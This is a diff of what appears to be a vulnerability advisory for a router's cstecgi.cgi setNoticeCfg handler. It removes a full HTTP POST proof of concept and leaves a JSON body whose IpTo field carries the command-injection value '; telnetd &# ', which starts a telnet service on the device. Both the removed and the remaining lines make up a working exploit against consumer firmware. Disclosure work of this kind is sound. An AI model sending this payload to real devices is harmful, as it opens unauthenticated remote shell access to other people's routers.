@@ -22,22 +22,7 @@ If an attacker injects malicious commands into the variable v34 (the IpTo parame
 
 # POC
 ```
-POST /cgi-bin/cstecgi.cgi HTTP/1.1
-Host: 192.168.0.1
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 234
-Origin: http://192.168.0.1
-Connection: close
-Referer: http://192.168.0.1/adm/notice.asp
-Cookie: SESSION_ID=2:1743878290:2
-Priority: u=0
-
-{"topicurl":"setting/setNoticeCfg","NoticeEnabled":"1","NoticeUrl":"www.111.COM","BtnName":"Click here to continue","WhiteListUrl1":"","WhiteListUrl2":"","WhiteListUrl3":"","IpFrom":"2","IpTo":"; telnetd &# ","NoticeTimeoutVal":"120"}
+"NoticeEnabled":"1","NoticeUrl":"www.111.COM","BtnName":"Click here to continue","WhiteListUrl1":"","WhiteListUrl2":"","WhiteListUrl3":"","IpFrom":"2","IpTo":"; telnetd &# ","NoticeTimeoutVal":"120"}
 ```
 
 ![Snipaste_2025-04-06_02-45-09](figures/Snipaste_2025-04-06_02-45-09.png)
